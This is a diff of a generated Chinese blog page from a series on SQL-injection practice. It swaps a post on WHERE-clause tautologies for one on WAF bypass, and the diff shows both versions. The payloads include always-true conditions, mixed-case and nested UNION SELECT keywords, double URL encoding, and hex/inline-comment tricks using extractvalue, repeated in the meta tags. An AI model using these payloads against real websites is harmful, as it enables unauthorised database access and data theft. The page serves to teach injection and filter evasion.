@@ -35,34 +35,34 @@
   <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
 
 
-<meta name="description" content="Where后条件的各种转换姿势 &apos; or &quot;a&quot;=&apos;a&apos;
-&apos; or &apos;a&apos;=n&apos;a&apos;               //unicode
-&apos; or &apos;a&apos;=b&apos;1100001&apos;         //binary
-&apos; or &apos;a&apos;=x&apos;61&apos;              //16进制
-&apos; or 1=true #true=1, false=0
-&apos; or 1 #true
-&apos; or version()=5.5">
+<meta name="description" content="大小写绕过最基本的的绕过，适用于过滤器对大小写敏感的场景
+page.php?id=1 UniOn sElEcT 1,2,3,4;
+替换关键字适用于过滤规则替换union select 等关键字的情况
+page.php?id =1 UNIunionON SELselectECT 1,2,3,4 ;
+也可以构造的更复杂视情况而定SeLSeselectleCTecT
+使用编码
+URL编码普通的URL编码">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入练级攻略-7-绕过姿势-(二)">
+<meta property="og:title" content="SQL注入练级攻略-7-绕过姿势之waf-(二)">
 <meta property="og:url" content="http://yoursite.com/2015/08/17/SQL注入练级攻略-7-绕过姿势-二/index.html">
 <meta property="og:site_name" content="FengGe">
-<meta property="og:description" content="Where后条件的各种转换姿势 &apos; or &quot;a&quot;=&apos;a&apos;
-&apos; or &apos;a&apos;=n&apos;a&apos;               //unicode
-&apos; or &apos;a&apos;=b&apos;1100001&apos;         //binary
-&apos; or &apos;a&apos;=x&apos;61&apos;              //16进制
-&apos; or 1=true #true=1, false=0
-&apos; or 1 #true
-&apos; or version()=5.5">
-<meta property="og:updated_time" content="2015-08-17T06:49:50.498Z">
+<meta property="og:description" content="大小写绕过最基本的的绕过，适用于过滤器对大小写敏感的场景
+page.php?id=1 UniOn sElEcT 1,2,3,4;
+替换关键字适用于过滤规则替换union select 等关键字的情况
+page.php?id =1 UNIunionON SELselectECT 1,2,3,4 ;
+也可以构造的更复杂视情况而定SeLSeselectleCTecT
+使用编码
+URL编码普通的URL编码">
+<meta property="og:updated_time" content="2015-08-20T01:32:13.171Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQL注入练级攻略-7-绕过姿势-(二)">
-<meta name="twitter:description" content="Where后条件的各种转换姿势 &apos; or &quot;a&quot;=&apos;a&apos;
-&apos; or &apos;a&apos;=n&apos;a&apos;               //unicode
-&apos; or &apos;a&apos;=b&apos;1100001&apos;         //binary
-&apos; or &apos;a&apos;=x&apos;61&apos;              //16进制
-&apos; or 1=true #true=1, false=0
-&apos; or 1 #true
-&apos; or version()=5.5">
+<meta name="twitter:title" content="SQL注入练级攻略-7-绕过姿势之waf-(二)">
+<meta name="twitter:description" content="大小写绕过最基本的的绕过，适用于过滤器对大小写敏感的场景
+page.php?id=1 UniOn sElEcT 1,2,3,4;
+替换关键字适用于过滤规则替换union select 等关键字的情况
+page.php?id =1 UNIunionON SELselectECT 1,2,3,4 ;
+也可以构造的更复杂视情况而定SeLSeselectleCTecT
+使用编码
+URL编码普通的URL编码">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -72,7 +72,7 @@
   };
 </script>
 
-  <title> SQL注入练级攻略-7-绕过姿势-(二) | FengGe </title>
+  <title> SQL注入练级攻略-7-绕过姿势之waf-(二) | FengGe </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -187,7 +187,7 @@
           
           
             
-              SQL注入练级攻略-7-绕过姿势-(二)
+              SQL注入练级攻略-7-绕过姿势之waf-(二)
             
           
         </h1>
@@ -222,22 +222,20 @@
       
 
       
-        <span itemprop="articleBody"><h2 id="Where后条件的各种转换姿势">Where后条件的各种转换姿势</h2><pre><code> <span class="string">' or "a"='</span>a<span class="string">'
-'</span> <span class="keyword">or</span> <span class="string">'a'</span>=n<span class="string">'a'</span>               <span class="comment">//unicode</span>
-<span class="string">' or '</span>a<span class="string">'=b'</span><span class="number">1100001</span><span class="string">'         //binary
-'</span> <span class="keyword">or</span> <span class="string">'a'</span>=x<span class="string">'61'</span>              <span class="comment">//16进制</span>
-<span class="string">' or 1=true #true=1, false=0
-'</span> <span class="keyword">or</span> <span class="number">1</span> #<span class="keyword">true</span>
-<span class="string">' or version()=5.5 #5.5.41-log
-'</span> <span class="keyword">or</span> round(pi(),<span class="number">1</span>)+<span class="keyword">true</span>+<span class="keyword">true</span>+<span class="number">0.4</span>=version() <span class="string">#3</span>.<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">0.4</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> <span class="string">'a'</span>=<span class="string">'b'</span>=<span class="string">'c'</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="string">'a'</span>=<span class="string">'b'</span>)=<span class="string">'c'</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="keyword">false</span>)=<span class="string">'c'</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="number">0</span>)=<span class="string">'c'</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="number">0</span>)=<span class="number">0</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> <span class="keyword">true</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users
-</code></pre></span>
+        <span itemprop="articleBody"><h2 id="大小写绕过">大小写绕过</h2><p>最基本的的绕过，适用于过滤器对大小写敏感的场景</p>
+<pre><code>page.php?id=<span class="number">1</span> UniOn sElEcT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;
+</code></pre><h2 id="替换关键字">替换关键字</h2><p>适用于过滤规则替换union select 等关键字的情况</p>
+<pre><code>page.php?id =<span class="number">1</span> UNIunionON SELselectECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> ;
+</code></pre><p>也可以构造的更复杂视情况而定SeLSeselectleCTecT</p>
+<h2 id="使用编码">使用编码</h2><ul>
+<li><p>URL编码<br>普通的URL编码可能无法实现绕过不过存在某种情况URL编码只进行了一次解码过滤可以用两次编码绕过</p>
+<p>  page.php?id=1%252f%252a*/UNION%252f%252a/SELECT </p>
+</li>
+<li><p>Hex编码</p>
+<p>  z.com/index.php?page_id=-15 /<em>!u%6eion</em>/ /<em>!se%6cect</em>/ 1,2,3,4,SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))<br>  //6e-&gt;n   6c-&gt;l  字母的十六进制编码，与ascii码一致，在python解释器中<br>  //python&gt; “admin”.encode(“hex”) #61646D696E<br>  //python&gt; “61646D696E”.decode(“hex”) #admin</p>
+</li>
+</ul>
+</span>
       
     </div>
 
@@ -288,7 +286,7 @@
           <div class="comments" id="comments">
             
               <div class="ds-thread" data-thread-key="2015/08/17/SQL注入练级攻略-7-绕过姿势-二/"
-                   data-title="SQL注入练级攻略-7-绕过姿势-(二)" data-url="http://yoursite.com/2015/08/17/SQL注入练级攻略-7-绕过姿势-二/">
+                   data-title="SQL注入练级攻略-7-绕过姿势之waf-(二)" data-url="http://yoursite.com/2015/08/17/SQL注入练级攻略-7-绕过姿势-二/">
               </div>
             
           </div>
@@ -328,7 +326,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">19</span>
+              <span class="site-state-item-count">20</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -395,7 +393,7 @@
           <div class="post-toc">
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Where后条件的各种转换姿势"><span class="nav-number">1.</span> <span class="nav-text">Where后条件的各种转换姿势</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#大小写绕过"><span class="nav-number">1.</span> <span class="nav-text">大小写绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#替换关键字"><span class="nav-number">2.</span> <span class="nav-text">替换关键字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用编码"><span class="nav-number">3.</span> <span class="nav-text">使用编码</span></a></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
